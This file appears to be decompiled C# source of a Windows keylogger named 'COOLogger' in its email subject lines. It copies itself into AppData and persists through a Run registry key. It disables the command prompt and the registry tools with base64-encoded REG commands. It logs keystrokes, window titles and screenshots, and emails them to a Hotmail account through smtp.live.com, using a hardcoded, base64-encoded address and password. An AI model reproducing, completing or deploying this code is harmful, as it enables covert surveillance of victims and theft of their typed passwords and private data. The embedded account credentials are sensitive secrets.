using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class iRREqRnBPwOzEdS
{
	private static string PJbYuRpvrDHVqsC = "YWxpY2VfeWFuZ19sQGhvdG1haWwuY29t";

	private static string LGjzSmGzpVeechT = "YnJvbmNvczEyMw==";

	private static string MTxKKZdgYwMFoWZ = "smtp.live.com";

	private static int tWaoyUhUHiFDfNe = 587;

	private static string RREqRnBPwOzEdSP;

	private static string JbYuRpvrDHVqsCL;

	private static string GjzSmGzpVeechTM;

	private static string TxKKZdgYwMFoWZt;

	private static string WaoyUhUHiFDfNeQ;

	private static string tJNQHgJoYUJdTKY;

	private static int lHuEcXzCiDIQGlu = 3600000;

	private static string wtRBLRNZpqMOXuc = null;

	private static string wKUEDqcEamBizlp = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string QECvOLhDbhdpsId = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string enxsWlEYrlbHQRP = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object QUtUfZroMhGxuGX = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string utyVcjObaqtwoNc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage VFnpKmqFCkxXXyH = new MailMessage();

	private static SmtpClient nnPXkMfLjBNBysL = new SmtpClient();

	[AccessedThroughProperty("nPXkMfLjBNBysLI")]
	private static IeOZfbmEFablJpT _nPXkMfLjBNBysLI;

	private static object WowmSNOMRDvDhIt = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox maaBKWySxVnznke = new RichTextBox();

	private static IeOZfbmEFablJpT nPXkMfLjBNBysLI
	{
		get
		{
			return _nPXkMfLjBNBysLI;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_nPXkMfLjBNBysLI != null)
			{
				IeOZfbmEFablJpT.KeyDown -= YiRREqRnBPwOzEd;
			}
			_nPXkMfLjBNBysLI = value;
			if (_nPXkMfLjBNBysLI != null)
			{
				IeOZfbmEFablJpT.KeyDown += YiRREqRnBPwOzEd;
			}
		}
	} = new IeOZfbmEFablJpT();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		tJNQHgJoYUJdTKY = Conversions.ToString(true);
		GjzSmGzpVeechTM = Conversions.ToString(true);
		TxKKZdgYwMFoWZt = Conversions.ToString(true);
		WaoyUhUHiFDfNeQ = Conversions.ToString(false);
		JbYuRpvrDHVqsCL = Conversions.ToString(true);
		RREqRnBPwOzEdSP = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, QUtUfZroMhGxuGX, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(QUtUfZroMhGxuGX, (object)"\\FnpKmqFCkxXXyHT.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(utyVcjObaqtwoNc + "\\FnpKmqFCkxXXyHT.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(RREqRnBPwOzEdSP))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(WowmSNOMRDvDhIt)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(WowmSNOMRDvDhIt), Operators.ConcatenateObject(Operators.ConcatenateObject(QUtUfZroMhGxuGX, (object)"\\"), WowmSNOMRDvDhIt));
			}
		}
		if (Conversions.ToBoolean(JbYuRpvrDHVqsCL))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(QUtUfZroMhGxuGX, (object)"\\FnpKmqFCkxXXyHT.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(GjzSmGzpVeechTM))
		{
			Interaction.Shell(SPJbYuRpvrDHVqs(wKUEDqcEamBizlp), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(TxKKZdgYwMFoWZt))
		{
			Interaction.Shell(SPJbYuRpvrDHVqs(QECvOLhDbhdpsId), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(WaoyUhUHiFDfNeQ))
		{
			Interaction.Shell(SPJbYuRpvrDHVqs(enxsWlEYrlbHQRP), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(3600000);
		val.add_Tick((EventHandler)eOZfbmEFablJpTi_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)PWowmSNOMRDvDhI_Ticked);
		val2.Start();
		nPXkMfLjBNBysLI.iPWowmSNOMRDvDh();
		Application.Run();
	}

	private static string WCwxvBlszQrqHwy()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string SPJbYuRpvrDHVqs(string LfINalGTHsUqpRy)
	{
		byte[] bytes = Convert.FromBase64String(LfINalGTHsUqpRy);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void eOZfbmEFablJpTi_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(tJNQHgJoYUJdTKY))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = TtfvyCtSvaKGuPG(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(QUtUfZroMhGxuGX, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(QUtUfZroMhGxuGX, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC));
				mailMessage.To.Add(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = maaBKWySxVnznke.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.live.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC), SPJbYuRpvrDHVqs(LGjzSmGzpVeechT));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				maaBKWySxVnznke.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage vFnpKmqFCkxXXyH = VFnpKmqFCkxXXyH;
		vFnpKmqFCkxXXyH.From = new MailAddress(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC));
		vFnpKmqFCkxXXyH.To.Add(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC));
		vFnpKmqFCkxXXyH.Subject = "COOLogger Logs from - " + Environment.UserName;
		vFnpKmqFCkxXXyH.Body = maaBKWySxVnznke.get_Text();
		vFnpKmqFCkxXXyH = null;
		SmtpClient smtpClient2 = nnPXkMfLjBNBysL;
		smtpClient2.Host = "smtp.live.com";
		smtpClient2.Port = 587;
		smtpClient2.EnableSsl = true;
		smtpClient2.Credentials = new NetworkCredential(SPJbYuRpvrDHVqs(PJbYuRpvrDHVqsC), SPJbYuRpvrDHVqs(LGjzSmGzpVeechT));
		smtpClient2.Send(VFnpKmqFCkxXXyH);
		smtpClient2 = null;
		maaBKWySxVnznke.set_Text("");
	}

	public static void YiRREqRnBPwOzEd(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = maaBKWySxVnznke;
		val.set_Text(val.get_Text() + nPXkMfLjBNBysLI.ItJNQHgJoYUJdTK(e));
	}

	public static void PWowmSNOMRDvDhI_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(wtRBLRNZpqMOXuc, WCwxvBlszQrqHwy(), false) != 0)
		{
			wtRBLRNZpqMOXuc = WCwxvBlszQrqHwy();
			if (Operators.CompareString(wtRBLRNZpqMOXuc, "", false) != 0)
			{
				RichTextBox val = maaBKWySxVnznke;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + wtRBLRNZpqMOXuc + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string TtfvyCtSvaKGuPG(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
